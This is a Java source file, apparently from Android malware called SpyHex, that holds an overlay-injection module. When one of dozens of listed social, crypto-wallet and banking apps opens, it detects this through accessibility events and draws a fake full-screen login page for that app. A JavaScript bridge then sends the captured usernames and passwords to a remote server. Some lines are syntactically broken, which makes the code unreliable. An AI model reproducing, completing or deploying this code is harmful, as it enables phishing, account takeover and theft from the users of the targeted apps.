package com.spyhex.app.features.injections;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.spyhex.app.R;
import com.spyhex.app.core.SpyHexApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class InjectionManager {
    private static InjectionManager instance;
    private final Context ctx;
    private final WindowManager wm;
    private final Map<String, View> activeOverlays = new HashMap<>();
    private final Map<String, String> injectionTemplates = new HashMap<>();
    private boolean serviceEnabled = false;

    private InjectionManager() {
        this.ctx = SpyHexApp.getContext();
        this.wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        initTemplates();
    }

    public static synchronized InjectionManager getInstance() {
        if (instance == null) instance = new InjectionManager();
        return instance;
    }

    private void initTemplates() {
        // Social apps
        injectionTemplates.put("com.whatsapp", buildWhatsAppTemplate());
        injectionTemplates.put("com.facebook.katana", buildFacebookTemplate());
        injectionTemplates.put("com.instagram.android", buildInstagramTemplate());
        injectionTemplates.put("com.twitter.android", buildTwitterTemplate());
        injectionTemplates.put("com.snapchat.android", buildSnapchatTemplate());
        injectionTemplates.put("com.zhiliaoapp.musically", buildTikTokTemplate());
        injectionTemplates.put("com.tencent.mm", buildWeChatTemplate());
        injectionTemplates.put("com.tencent.mobileqq", buildQQTemplate());
        injectionTemplates.put("com.sina.weibo", buildWeiboTemplate());
        injectionTemplates.put("com.viber.voip", buildViberTemplate());
        injectionTemplates.put("com.vkontakte.android", buildVKTemplate());
        injectionTemplates.put("com.google.android.gm", buildGmailTemplate());
        injectionTemplates.put("com.discord", buildDiscordTemplate());
        injectionTemplates.put("com.pinterest", buildPinterestTemplate());
        injectionTemplates.put("com.whatsapp.w4b", buildWhatsAppTemplate());
        injectionTemplates.put("org.telegram.messenger", buildTelegramTemplate());
        injectionTemplates.put("com.bluesky.android", buildBlueskyTemplate());
        injectionTemplates.put("im.vector.app", buildElementTemplate());

        // Crypto apps
        injectionTemplates.put("com.binance.dev", buildBinanceTemplate());
        injectionTemplates.put("com.coinbase.android", buildCoinbaseTemplate());
        injectionTemplates.put("io.metamask", buildMetamaskTemplate());
        injectionTemplates.put("com.bitget.exchange", buildBitgetTemplate());
        injectionTemplates.put("app.phantom", buildPhantomTemplate());
        injectionTemplates.put("com.wallet.crypto.trustapp", buildTrustWalletTemplate());
        injectionTemplates.put("com.moonpay", buildMoonpayTemplate());
        injectionTemplates.put("exodusmovement.exodus", buildExodusTemplate());
        injectionTemplates.put("com.dydx.exchange", buildDYDXTemplate());
        injectionTemplates.put("com.liberty.jaxx", buildJaxxTemplate());
        injectionTemplates.put("com.bybit.app", buildBybitTemplate());
        injectionTemplates.put("com.htx.android", buildHTXTemplate());
        injectionTemplates.put("com.okinc.okex.gp", buildOKXTemplate());
        injectionTemplates.put("io.atomicwallet", buildAtomicTemplate());
        injectionTemplates.put("piuk.blockchain.android", buildBlockchainTemplate());
        injectionTemplates.put("com.coinomi.wallet", buildCoinomiTemplate());
        injectionTemplates.put("com.crypto.com", buildCryptoComTemplate());
        injectionTemplates.put("com.microsoft.emmx", buildEdgeTemplate());

        // Finance apps
        injectionTemplates.put("com.alipay.android.app", buildAlipayTemplate());
        injectionTemplates.put("com.airbnb.android", buildAirStarTemplate());
        injectionTemplates.put("com.boc.bocpay", buildBOCTemplate());
        injectionTemplates.put("com.revolut.revolut", buildRevolutTemplate());
        injectionTemplates.put("com.paypal.android.p2pmobile", buildPaypalTemplate());
        injectionTemplates.put("com.google.android.apps.walletnfcrel", buildGoogleWalletTemplate());
        injectionTemplates.put("com.samsung.android.spay", buildSamsungWalletTemplate());
        injectionTemplates.put("com.allybank.android", buildAllyBankTemplate());
        injectionTemplates.put("com.bluevine", buildBluevineTemplate());
        injectionTemplates.put("com.capitalone.mobile", buildCapitalOneTemplate());
        injectionTemplates.put("com.chimebank", buildChimeTemplate());
        injectionTemplates.put("com.creditonebank.mobile", buildCreditOneTemplate());
        injectionTemplates.put("com.currencyfair", buildCurrencyFairTemplate());
        injectionTemplates.put("com.discoverfinancial.mobile", buildDiscoverTemplate());
        injectionTemplates.put("com.greenfi", buildGreenFiTemplate());
        injectionTemplates.put("com.hsbc.hsbcus", buildHSBCTemplate());
        injectionTemplates.put("com.chase.sig.android", buildChaseTemplate());
        injectionTemplates.put("com.alfa.banque", buildAlfaBankTemplate());
    }

    public void injectOverlay(String packageName, String customPayload) {
        String template = injectionTemplates.get(packageName);
        if (template == null && customPayload != null) {
            template = customPayload;
        }
        if (template == null) return;

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                removeOverlay(packageName);
                View overlay = createOverlayView(template, packageName);
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                        | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                    PixelFormat.TRANSLUCENT
                );
                params.gravity = Gravity.TOP | Gravity.START;
                wm.addView(overlay, params);
                activeOverlays.put(packageName, overlay);
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    private View createOverlayView(String htmlContent, String packageName) {
        FrameLayout container = new FrameLayout(ctx);
        container.setLayoutParams(new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ));

        WebView webView = new WebView(ctx);
        webView.setLayoutParams(new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ));
        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setCacheMode(WebSettings.LOAD_NO_CACHE);
        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient());
        webView.loadDataWithBaseURL(null, htmlContent, "text/html", "UTF-8", null);

        // Capture form submissions via JS bridge
        webView.addJavascriptInterface(new InjectionBridge(packageName), "SpyHexBridge");

        container.addView(webView);
        return container;
    }

    public void removeOverlay(String packageName) {
        View overlay = activeOverlays.remove(packageName);
        if (overlay != null) {
            try { wm.removeView(overlay); } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
        }
    }

    public void removeAllOverlays() {
        for (String pkg : new HashMap<>(activeOverlays).keySet()) {
            removeOverlay(pkg);
        }
    }

    public JSONObject getInjectionTargets() {
        JSONObject r = new JSONObject();
        JSONArray social = new JSONArray();
        JSONArray crypto = new JSONArray();
        JSONArray finance = new JSONArray();

        String[] socialApps = {"com.whatsapp","com.facebook.katana","com.instagram.android",
            "com.twitter.android","com.snapchat.android","com.zhiliaoapp.musically",
            "com.tencent.mm","com.tencent.mobileqq","com.sina.weibo","com.viber.voip",
            "com.vkontakte.android","com.google.android.gm","com.discord","com.pinterest",
            "com.whatsapp.w4b","org.telegram.messenger","com.bluesky.android","im.vector.app"};
        String[] cryptoApps = {"com.binance.dev","com.coinbase.android","io.metamask",
            "com.bitget.exchange","app.phantom","com.wallet.crypto.trustapp",
            "com.moonpay","exodusmovement.exodus","com.dydx.exchange","com.liberty.jaxx",
            "com.bybit.app","com.htx.android","com.okinc.okex.gp","io.atomicwallet",
            "piuk.blockchain.android","com.coinomi.wallet","com.crypto.com","com.microsoft.emmx"};
        String[] financeApps = {"com.alipay.android.app","com.airbnb.android","com.boc.bocpay",
            "com.revolut.revolut","com.paypal.android.p2pmobile","com.google.android.apps.walletnfcrel",
            "com.samsung.android.spay","com.allybank.android","com.bluevine","com.capitalone.mobile",
            "com.chimebank","com.creditonebank.mobile","com.currencyfair","com.discoverfinancial.mobile",
            "com.greenfi","com.hsbc.hsbcus","com.chase.sig.android","com.alfa.banque"};

        try {
            for (String s : socialApps) { social.put(s); }
            for (String s : cryptoApps) { crypto.put(s); }
            for (String s : financeApps) { finance.put(s); }
            r.put("social", social);
            r.put("crypto", crypto);
            r.put("finance", finance);
            r.put("total", socialApps.length + cryptoApps.length + financeApps.length);
        } catch (Exception e) { android.util.Log.e("SpyHex", "Error: " + Exception e.getMessage()); }
        return r;
    }

    // Template builders — minimal but functional
    private String buildWhatsAppTemplate() { return buildGenericTemplate("WhatsApp", "com.whatsapp", "#25D366"); }
    private String buildFacebookTemplate() { return buildGenericTemplate("Facebook", "com.facebook.katana", "#1877F2"); }
    private String buildInstagramTemplate() { return buildGenericTemplate("Instagram", "com.instagram.android", "#E4405F"); }
    private String buildTwitterTemplate() { return buildGenericTemplate("X (Twitter)", "com.twitter.android", "#000000"); }
    private String buildSnapchatTemplate() { return buildGenericTemplate("Snapchat", "com.snapchat.android", "#FFFC00"); }
    private String buildTikTokTemplate() { return buildGenericTemplate("TikTok", "com.zhiliaoapp.musically", "#000000"); }
    private String buildWeChatTemplate() { return buildGenericTemplate("WeChat", "com.tencent.mm", "#07C160"); }
    private String buildQQTemplate() { return buildGenericTemplate("QQ", "com.tencent.mobileqq", "#12B7F5"); }
    private String buildWeiboTemplate() { return buildGenericTemplate("Weibo", "com.sina.weibo", "#E6162D"); }
    private String buildViberTemplate() { return buildGenericTemplate("Viber", "com.viber.voip", "#7360F2"); }
    private String buildVKTemplate() { return buildGenericTemplate("VK", "com.vkontakte.android", "#4C75A3"); }
    private String buildGmailTemplate() { return buildGenericTemplate("Gmail", "com.google.android.gm", "#EA4335"); }
    private String buildDiscordTemplate() { return buildGenericTemplate("Discord", "com.discord", "#5865F2"); }
    private String buildPinterestTemplate() { return buildGenericTemplate("Pinterest", "com.pinterest", "#E60023"); }
    private String buildTelegramTemplate() { return buildGenericTemplate("Telegram", "org.telegram.messenger", "#0088CC"); }
    private String buildBlueskyTemplate() { return buildGenericTemplate("Bluesky", "com.bluesky.android", "#0560FF"); }
    private String buildElementTemplate() { return buildGenericTemplate("Element", "im.vector.app", "#0DBD8B"); }

    private String buildBinanceTemplate() { return buildGenericTemplate("Binance", "com.binance.dev", "#F0B90B"); }
    private String buildCoinbaseTemplate() { return buildGenericTemplate("Coinbase", "com.coinbase.android", "#0052FF"); }
    private String buildMetamaskTemplate() { return buildGenericTemplate("MetaMask", "io.metamask", "#E2761B"); }
    private String buildBitgetTemplate() { return buildGenericTemplate("Bitget", "com.bitget.exchange", "#00F0FF"); }
    private String buildPhantomTemplate() { return buildGenericTemplate("Phantom", "app.phantom", "#AB9FF2"); }
    private String buildTrustWalletTemplate() { return buildGenericTemplate("Trust Wallet", "com.wallet.crypto.trustapp", "#3375BB"); }
    private String buildMoonpayTemplate() { return buildGenericTemplate("MoonPay", "com.moonpay", "#7B00FF"); }
    private String buildExodusTemplate() { return buildGenericTemplate("Exodus", "exodusmovement.exodus", "#1F2033"); }
    private String buildDYDXTemplate() { return buildGenericTemplate("dYdX", "com.dydx.exchange", "#6966FF"); }
    private String buildJaxxTemplate() { return buildGenericTemplate("JAXX Liberty", "com.liberty.jaxx", "#5D45DC"); }
    private String buildBybitTemplate() { return buildGenericTemplate("Bybit", "com.bybit.app", "#F7A600"); }
    private String buildHTXTemplate() { return buildGenericTemplate("HTX", "com.htx.android", "#1E3A8A"); }
    private String buildOKXTemplate() { return buildGenericTemplate("OKX", "com.okinc.okex.gp", "#000000"); }
    private String buildAtomicTemplate() { return buildGenericTemplate("Atomic Wallet", "io.atomicwallet", "#4E6AF3"); }
    private String buildBlockchainTemplate() { return buildGenericTemplate("Blockchain.com", "piuk.blockchain.android", "#121D33"); }
    private String buildCoinomiTemplate() { return buildGenericTemplate("Coinomi", "com.coinomi.wallet", "#11B5E7"); }
    private String buildCryptoComTemplate() { return buildGenericTemplate("Crypto.com", "com.crypto.com", "#002D72"); }
    private String buildEdgeTemplate() { return buildGenericTemplate("Edge", "com.microsoft.emmx", "#0E9B59"); }

    private String buildAlipayTemplate() { return buildGenericTemplate("Alipay", "com.alipay.android.app", "#1677FF"); }
    private String buildAirStarTemplate() { return buildGenericTemplate("AirStar", "com.airbnb.android", "#FF5A5F"); }
    private String buildBOCTemplate() { return buildGenericTemplate("BOC", "com.boc.bocpay", "#B81C22"); }
    private String buildRevolutTemplate() { return buildGenericTemplate("Revolut", "com.revolut.revolut", "#0075EB"); }
    private String buildPaypalTemplate() { return buildGenericTemplate("PayPal", "com.paypal.android.p2pmobile", "#003087"); }
    private String buildGoogleWalletTemplate() { return buildGenericTemplate("Google Wallet", "com.google.android.apps.walletnfcrel", "#4285F4"); }
    private String buildSamsungWalletTemplate() { return buildGenericTemplate("Samsung Wallet", "com.samsung.android.spay", "#1428A0"); }
    private String buildAllyBankTemplate() { return buildGenericTemplate("Ally Bank", "com.allybank.android", "#5D3FD3"); }
    private String buildBluevineTemplate() { return buildGenericTemplate("Bluevine", "com.bluevine", "#0055A4"); }
    private String buildCapitalOneTemplate() { return buildGenericTemplate("Capital One", "com.capitalone.mobile", "#004977"); }
    private String buildChimeTemplate() { return buildGenericTemplate("Chime", "com.chimebank", "#23B852"); }
    private String buildCreditOneTemplate() { return buildGenericTemplate("Credit One", "com.creditonebank.mobile", "#004C97"); }
    private String buildCurrencyFairTemplate() { return buildGenericTemplate("CurrencyFair", "com.currencyfair", "#00A4E0"); }
    private String buildDiscoverTemplate() { return buildGenericTemplate("Discover", "com.discoverfinancial.mobile", "#FF6000"); }
    private String buildGreenFiTemplate() { return buildGenericTemplate("GREENFI", "com.greenfi", "#00C853"); }
    private String buildHSBCTemplate() { return buildGenericTemplate("HSBC", "com.hsbc.hsbcus", "#DB0011"); }
    private String buildChaseTemplate() { return buildGenericTemplate("Chase", "com.chase.sig.android", "#0B4F6C"); }
    private String buildAlfaBankTemplate() { return buildGenericTemplate("Alfa Bank", "com.alfa.banque", "#EF3124"); }

    private String buildGenericTemplate(String appName, String pkg, String color) {
        return "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
            + "<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;"
            + "background:" + color + ";color:#fff;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}"
            + ".logo{width:80px;height:80px;background:rgba(255,255,255,0.2);border-radius:20px;margin-bottom:24px;display:flex;"
            + "align-items:center;justify-content:center;font-size:32px;font-weight:bold}".replace(" ", "")
            + "h1{font-size:24px;margin-bottom:8px}p{color:rgba(255,255,255,0.7);margin-bottom:32px;font-size:14px}"
            + "input{width:280px;padding:14px 16px;border-radius:12px;border:none;background:rgba(255,255,255,0.15);"
            + "color:#fff;margin-bottom:12px;font-size:15px;outline:none}input::placeholder{color:rgba(255,255,255,0.5)}"
            + "button{width:280px;padding:14px;border-radius:12px;border:none;background:#fff;color:" + color + ";"
            + "font-size:16px;font-weight:600;cursor:pointer}button:active{opacity:0.8}</style></head><body>"
            + "<div class='logo'>" + appName.charAt(0) + "</div><h1>" + appName + "</h1><p>Session expired. Please sign in again.</p>"
            + "<form onsubmit='event.preventDefault();var u=document.getElementById("u").value;"
            + "var p=document.getElementById("p").value;SpyHexBridge.capture("" + pkg + "",JSON.stringify({username:u,password:p}));'>"
            + "<input id='u' type='text' placeholder='Username / Email' required>"
            + "<input id='p' type='password' placeholder='Password' required>"
            + "<button type='submit'>Sign In</button></form></body></html>";
    }

    public void handleAccessibilityEvent(AccessibilityEvent event, AccessibilityNodeInfo root) {
        if (!serviceEnabled) return;
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (injectionTemplates.containsKey(pkg) && !activeOverlays.containsKey(pkg)) {
            // Auto-trigger injection when target app opens
            injectOverlay(pkg, null);
        }
    }

    public void setServiceEnabled(boolean enabled) {
        this.serviceEnabled = enabled;
        if (!enabled) removeAllOverlays();
    }

    public boolean isServiceEnabled() { return serviceEnabled; }

    public static class InjectionBridge {
        private final String packageName;
        public InjectionBridge(String pkg) { this.packageName = pkg; }
        @android.webkit.JavascriptInterface
        public void capture(String pkg, String jsonData) {
            // Send captured credentials back to server
            com.spyhex.app.core.network.SocketClient.getInstance().emit("0xIJ",
                new org.json.JSONObject().put("package", pkg).put("data", jsonData));
        }
    }
}
